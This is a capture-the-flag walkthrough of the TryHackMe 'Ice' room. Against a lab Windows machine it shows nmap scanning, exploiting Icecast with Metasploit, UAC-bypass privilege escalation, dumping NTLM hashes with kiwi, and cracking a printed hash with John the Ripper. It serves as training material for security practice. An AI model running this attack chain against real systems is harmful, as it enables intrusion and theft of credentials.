---
layout: solution
category: TryHackMe
contest_code: General
contest_name: General
problem_code: ICE
problem_name: Ice
comments: false
tags: windows nmap mimikatz metasploit
date: 2021-08-19
---

### A simple nmap scan was conducted on the machine. Interesting services like rdp, http were running. Something eye catching was found where a service called icecast was running for http
```
nmap -sV -sC 10.10.7.18
```
![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Ice/nmap.png)

‎


###  Metasploit was then launched and looked for any vulnerability related to icecast and there was 1. Thus, we exploit the machine using that vulnerability

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Ice/metasploit.png)

<p style="color:orange;">‎Started Listener</p>

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Ice/listener.png)

‎


### We need to escalate our priviledges. Thus an attempt was made to perform post-exploitation enumeration by running a local_exploit_suggester on the meterpreter session that listed possible local exploit we can perform. The first ne looked promising thus it was selected for priviledge escalation and was successful. 
```
run post/multi/recon/local_exploit_suggester
```
![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Ice/exploit_suggester.png)

```
use exploit/windows/local/bypassuac_eventvwr
```
![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Ice/priv_escal.png)


‎


### Now we need to get the password for the 'DARK' user for the flag. Thus kiwi was loaded to dump the ntlm hashes. And then john the ripper was used to crack the hash

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Ice/hashdump.png)

<pre 
  class="command-line" 
  data-prompt="shank@kali:~$ " 
  data-output="2"
><code class="language-bash">cat passw
Dark:7c4fe5eada682714a036e39378362bab
</code>
</pre> 

‎
<p style="color:orange;">‎Cracking Password</p>

```
john --format=NT --wordlist=/usr/share.wordlists/rockyou.txt passw
```
‎![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Ice/crack_pass.png)

